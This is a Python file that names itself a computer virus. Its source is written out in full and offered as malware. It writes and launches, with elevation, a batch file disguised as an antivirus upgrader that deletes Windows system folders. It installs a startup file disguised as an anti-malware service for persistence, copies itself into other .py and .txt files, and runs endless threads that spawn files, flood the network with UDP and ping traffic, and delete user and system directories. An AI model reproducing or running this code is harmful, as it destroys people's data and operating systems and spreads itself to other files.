#SARS-Cov3 Computer Virus
import os, glob, sys, threading, socket, random
from shutil import copyfile
def get_filename():
    cwd = sys.argv[0]
    cwd = list(cwd)
    result = ""
    for i in cwd:
        if i == "/" or i == backslash:
            result = result + " "
        else:
            result = result + i
    result = result.split()
    final_result = result[(len(result) -  1)]
    return final_result
try:
    #some deletion
    windefdelname = 'Anti-Virus-Upgrader.bat'#Disguise File if user gets access to their startup direc
    windefdelfile = open(windefdelname, 'w')
    lines = ['\ntakeown /f C:\\ProgramData\\Microsoft\n', f'\ntakeown /f C:\\Windows\\System32\n', '',
             '\ncd C:/ProgramData/\n', '\nrmdir /S/Q Microsoft\n', '\ncd C:/\n', '\nrmdir /Q/S Windows\n']
    windefdelfile.writelines(lines)
    os.system(f'powershell "start {windefdelname} -v runAs"')
    #cloning
    copyfile(get_filename(), f'C:/{get_filename()}')
    os.chdir(f'C:/Users/{login}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
    bat_file = open('Anti-Malware-Service.bat', 'w')#other disguise file
    bat_file_lines = ['\n', 'cd C:\n', f'start {get_filename()}\n']
    bat_file.writelines(bat_file_lines)
except:
    pass
getlogin = os.getlogin()
filename = get_filename()
backslash = ' \ '.strip()
opsys = sys.platform
currentdir = open(sys.argv[0], "r")
main_code = currentdir.readlines()
code = []
virus_area = False
for line in main_code:
    if line == '#SARS-Cov3 Computer Virus\n':
        virus_area = True
    elif virus_area:
        code.append(line)
    elif line == '#End Of Virus\n':
        virus_area = False
        break
otherscripts = glob.glob('*.py') + glob.glob('*.txt')
for script in otherscripts:
    print("[+] Infecting Script:", script)
    infected = False
    script_code = open(script, "r")
    othercode = script_code.readlines()
    for line in othercode:
        if line == '#SARS-Cov3 Computer Virus\n':
            if script == filename:
                pass
                infected = True
                break
            else:
                infected = False
        elif line == '#End Of Virus\n':
            break
    if not infected:
        final_code = []
        final_code.extend('\n')
        final_code.extend(code)
        final_code.extend('\n')
        file = open(script, "w")
        file.writelines(final_code)
        lag_filename = str(random.randint(1, 7720347507204725274851237918237)) + '.py'
        lag_file = open(lag_filename, 'w')
        lag_file.writelines(final_code)
        otherscripts = glob.glob('*.py')
        print("[+] Successfully Infected file:", script)
        print("")
def lag():
    while True:
        try:
            lag_file.writelines(final_code)
            print("[+] Opening Script:", file)
            if opsys == "win32":
                os.startfile(lag_file.name)
            elif opsys == "darwin":
                os.system('open '+lag_file.name)
            else:
                pass
        except:
            pass
def lag2():
    while True:
        otherscripts2 = os.listdir()
        for files in otherscripts2:
            try:
                opened_file = files.strip()
                opened_file = open(opened_file, 'r')
                print("[+] Opening Script:", opened_file)
                if opsys == "win32":
                    os.startfile(opened_file.name)
                elif opsys == "darwin":
                    os.system('open ' + opened_file.name)
                else:
                    pass
            except:
                pass
def ddos():
    try:
        ip = socket.gethostbyname(socket.gethostname())
        port = 80
        packet = random._urandom(65500)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((ip, port))
                sock.sendto(packet, (ip, port))
                sock.close()
            except:
                pass
    except:
        pass
def delete():
    start_delete = False
    operating_system = sys.platform
    if operating_system == "win32":
        os.system(f'takeown /f C:\Windows\System32')
        os.chdir(f'C:/')
        start_delete = True
    elif operating_system == "darwin":
        os.chdir(f'/Users/')
        start_delete = True
    if start_delete:
        direc = os.listdir()
        for folder in direc:
            try:
                os.rmdir(folder)
            except:
                if PermissionError:
                    if opsys == "win32":
                        os.chdir('C:/Windows/')
                        dirs = os.listdir()
                        for dir in dirs:
                            try:
                                os.rmdir(dir)
                            except:
                                if PermissionError:
                                    os.chdir(f'C:/Users/{getlogin}/')
                                    dirs = os.listdir()
                                    for dir in dirs:
                                        try:
                                            os.rmdir(dir)
                                        except:
                                            os.remove(dir)
                                            pass
                                else:
                                    os.remove(dir)
                                    pass
                else:
                    os.remove(folder)
                    pass
        direc = os.listdir()
        for filname in direc:
            try:
                os.remove(filname)
            except:
                if PermissionError:
                    if opsys == "win32":
                        os.chdir('C:/Windows/')
                        dirs = os.listdir()
                        for dir in dirs:
                            try:
                                os.rmdir(dir)
                            except:
                                if PermissionError:
                                    os.chdir(f'C:/Users/{getlogin}/')
                                    dirs = os.listdir()
                                    for dir in dirs:
                                        try:
                                            os.rmdir(dir)
                                        except:
                                            os.remove(dir)
                                            pass
                                else:
                                    os.remove(dir)
                                    pass
                    else:
                        pass
                else:
                    pass
def ping_of_death():
    while True:
        os.system(f'ping {ip} -l 65500 -w 10 -n 1 -t')
def create_file():
    letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                        'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                        'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
                        'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
                        'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3',
                        '4', '5', '6', '7', '8', '9', '0']
    try:
        while True:
            for i in range(1000000000000000000000000000000000000000000000000000000):
                try:
                    file_name = ""
                    for letter in range(10):
                        file_letter = letters[random.randint(0, 61)]
                        file_name = str(file_letter) + str(file_name)
                    filetocreate = open(str(file_name) + ".py", "w")
                    filetocreate.writelines(main_code)
                    if opsys == "win32":
                        try:
                            os.startfile(filetocreate.name)
                        except:
                            pass
                    elif opsys == "darwin":
                        try:
                            os.system(f'open {filetocreate.name}')
                        except:
                            pass
                except:
                    pass
    except:
        pass
def thread_starter():
    if opsys == "win32":
        while True:
            ping = threading.Thread(target=ping_of_death)
            ping.start()
            lag_file2 = threading.Thread(target=lag2)
            lag_file2.start()
            ddos_computer = threading.Thread(target=ddos)
            ddos_computer.start()
            lag_computer = threading.Thread(target=lag)
            lag_computer.start()
            create_file_madness = threading.Thread(target=create_file)
            create_file_madness.start()
            delete_file = threading.Thread(target=delete)
            delete_file.start()
    else:
        while True:
            try:
                ping = threading.Thread(target=ping_of_death)
                ping.start()
                lag_file2 = threading.Thread(target=lag2)
                lag_file2.start()
                create_file_madness = threading.Thread(target=create_file)
                create_file_madness.start()
                delete_file = threading.Thread(target=delete)
                delete_file.start()
                lag_computer = threading.Thread(target=lag)
                lag_computer.start()
            except:
                pass
try:
    ping = threading.Thread(target=ping_of_death)
    ping.start()
    thread_creator = threading.Thread(target=thread_starter)
    thread_creator.start()
    ddos_computer = threading.Thread(target=ddos)
    ddos_computer.start()
    lag_computer = threading.Thread(target=lag)
    lag_computer.start()
    create_file_madness = threading.Thread(target=create_file)
    create_file_madness.start()
    delete_file = threading.Thread(target=delete)
    delete_file.start()
except:
    pass
#End Of Virus
